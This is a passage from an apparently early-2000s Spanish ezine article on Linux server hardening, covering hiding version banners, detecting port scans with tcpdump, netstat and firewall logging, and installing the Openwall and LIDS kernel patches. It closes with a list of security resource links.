+Microsoft si el del faño del unicode y que tantos scripts kiddies han visto la
+gloria y la luz divina , gracias a el xD )
+
+Otra cosa es al instalar modulos al apache estaticamente os cambian tambien
+la version si compilas el Apache + PHP , te cambiara la version tonces o con
+un editor hexadecimal tambien lo puedes cambiar o vueleves a compilar .
+
+Tambien si quereis podeis usar programas de chekeo como el nessus pero ten 
+en cuenta una cosa siempre intenta borrar la version del daemon por que la 
+mayoria de los chequeos se basa en eso en comprobar la version.
+
+Ya que toy de suerte comentar que los rpm instalados nunca conviene instalarlos
+por ejemplo la version 6.x de la SuSE si mal no recuerdo traia una linea mal
+en httpd.conf . En ves de usar "ScriptAlias" para la redireccion de un 
+directorio para ejecutar los cgis usaba "Alias" y con eso traia el consiguiente
+error de poder leer los Cgi's que se encontrasen en el direcotrio "cgi-bin".
+
+Para mas info : www.apache.org 
+
+-=( 9 )=--=( Quien nos ataca )=-
+
+Que NOS ATAKAN!!! digase con entonacion de los personajes de south park :) .
+
+En este capitulo explicare como saber si nos estando escaneando o si nos estan
+haciendo algun tipo de atake de los ya explicados antes el smurf por ejemplo
+este nos dariamos cuenta rapidamente . Pero hay otros que son mas dificiles de
+averiguar un scan de puertos , etc. Tambien esta bien tener controlado por una
+terminal el tcp_wrapers para saber quien hay que cada momento . Voy a explicar
+algunos programas y como se podria detectar . Bueno ante todo que no cunda la
+el panico si nos damos cuenta de que nos estana scaneando los puertos esto
+seria algo normal es costumbre que la gente del irc con su mas que magnifico
+y esplendido script de Windows incluya algun utilidad pa scanear .
+
+Primero esta el tcpdump un poco vasto para el uso que le vamos a dar pero 
+bueno el tcpdump va volcando en pantalla todo lo que le va llegando a traves
+del interfaz que tu le digas por ejemplo si quieres listar el loopback pon
+poner esto bastara :
+
+trycky@Lepton:~ > tcpdump -i lo 
+
+Nos dara un listado muy grande por ejemplo para ataques smurf se da cuenta uno
+rapidamente por la cantidad de paketes que va uno reciviendo pero si nos estan
+scaneando los puertos ia es mas dificil por que dependiendo del tipo de scan
+son mas finos que otros .
+
+trycky@Lepton:~ > tcpdump -aqtm -i lo
+
+Ahora lo que nos muestra se menor debido a que nos mostrara la hora y menos 
+cosillas . Para mas informacion man tcpdump .
+
+Otra herramienta tambien util para saber si nos estan escaneando podria ser
+sacnlogd que nos puede advertir de varios tipos de scan ( syn , connect ).
+
+Otra cosa mu interesante es si tenemos un firewall activo (ipchais) le podemos
+añadir la flag "-l" y tonces nos logeara todos los intentos de dicha regla .
+
+Para los windozeros no estais del todo perdios tambien teneis formas de saber
+quien hay en vuestra maquina y todas las conexiones pendientes , con que si
+no hiba a ser con el netstat pero no confundamos este es una mierda comparado
+con el de linux :) pero nos da el pego .
+Por ejemp si queremos q este todo el rato viendo las conexiones de la makina 
+lo pondremos con : 
+
+netstat -a 
+
+Aunque otra buena opcion es pasarle la flag '-l' al ipchains para que nos loge
+cualquier tipo accion en esa regla del firewall .
+
+Aunque sigue habiendo multitud de herramientas para saber si nos estan 
+haciendo algun tipo de ataque o de scan :
+
+portsentry , ippl , iptraf ( Un monitor de Red ) , logit , iplog ...
+
+A veces estas herramientas muestran demasiada informacion y es algo pesado por
+lo que tendreis que configurarlas . Si en cambio quereis un scaner que suelte
+mucha infomarcion y bien organizado todo usar el "ethereal" .
+
+Si usais el WindowMaker hay un boton mu simpatico que nos dice en todo momento
+quien hay conectado a ciertos servicios de nuestra maquina el wminet buscarlo
+por que ahora no tengo la url exacta .
+
+Si compilais el Kernel con lids trae una opcion para poder logear los intentos
+de scaneo.
+
+-=( 10 )=--=( Pachanga Script Admin )=-
+
+Pachanga Script Admin es una coleccion de scripts creados por mi para el buen
+funcionamiento de la makina xD osea son un par de scripts to cutres que buscan
+algunas advertencias ya conocidas e algunos faños importantes todavia llevo mu
+poco pero no creo que haga mucho mas .
+
+Por lo que llevo ahora se buscan ficheros con setsuids se comparan , se crea
+una lista con md5 y se compara al cierto tiempo por si te han colado algun 
+troyano , etc .
+
+URL : 7a69ezine.org
+
+-=( 11 )=--=( Parches para el Kernel )=-
+
+Parches para el kernel : existen ciertos parches que nos pueden ayudar a 
+mantener la seguridad del sistema el parche que voy a explicar escrito por
+solar designer el creador del tito jhony , etc . Este parche lo que hace es
+poder evitar los buffer stack overflows que consisten en sobrepasar la pila 
+y poder inyectar un codigo que nos lleve a donde queramos la "shellcode" .
+Bueno lo que hace es desbordar el buffer da igual si por medio del standard
+stack overflow o por medio de la nueva oleada de print formats , etc. Esta
+explicacion es un poco cutre pero sirve para definir si no buscar algun doc
+que ya hay muchos escritos por lo demas el parche trae mas protecciones como 
+es prohibir los enlazes simbolicos en "/tmp" entre otras medidas que explica
+en su README . Bueno supongo que sabreis compilar el kernel a un a si se hace
+de la siguiente forma :
+
+lepton:/usr/src/linux # patch -p1 -E < linux-2.2.17-ow1.diff
+
+Y despues a la hora de compilacion del kernel tendreis nuevas opciones de 
+seguridad las elegies y volveis a compilar . 
+
+openwall.org
+
+Tambien se encuentra el parche "lids" que lo que hace es que ciertos 
+directorios y ficheros sean accesibles para un usario por lo que nos podriamos
+evitar un xploit al httpd como explica el doc por que al ganar una cuenta no
+tendriamos ningun permiso por que realmente el directorio donde este el httpd
+"/usr/local/apache" solo seria visible para el usario httpd o el que designado
+y las paginas de los usarios solo se podrian actualizar por medio del webadmin
+pero cuidado que este programa contiene algun que otro faño en sus versiones 
+anteriores. Bueno esto es solo un ejemp de lo que se puede hacer con lids y 
+tmb decir que hace poco salio un gran faño para el kernel 2.2.16 que usase 
+lids que permitia escribir y leer ficheros en los cuales no tenias permisos .
+
+El uso de lids es algo mas complejo por lo que es mejor que os lo bajeis de 
+internet y lo compiles con la ayuda que trae.
+
+http://www.lids.org
+
+-=( 12 )=--=( Enlaces interesantes )=- 
+
+www.nessus.org : Pagina de un programa de chekeo de seguridad .
+www.freashmeat.org : Pagina donde podras encontrar programas y actualizaciones.
+www.linuxapps.com   : Del estilo de www.freashmeat.org .
+www.kernelnotes.org : Para estar al dia del Kernel x) .
+www.hert.org : Como el cert pero a lo hacker ta mu bien la page .
+www.cert.org : Pagina con abudante info a lo legal claro .
+www.opensec.net  : Pagina con abundantes herramientas de seguridad .
+www.openwall.org : Pagina con bastantes cosas interesantes de seguridad .
+www.barrapunto.com : Pagina de la actualidad de linux tipo sladshot .
+www.bsdtoday.org : Pagina de noticias de BSD sobre to de Open mu buena .
+securify.packetstorm.org : Pagina de Seguridad con multitud de cositas x) .
+rexgrep.tripod.com : Pagina donde podremos bajar un programa para controlar el
+		     total de procesos por usario y evitar fork bomb xD .
+
+/usr/src/linux/Documentation : Pa que quereis mas .
+
+7a69ezine.org : Publicidad gratis aqui xD .
+
+
+*EOF*
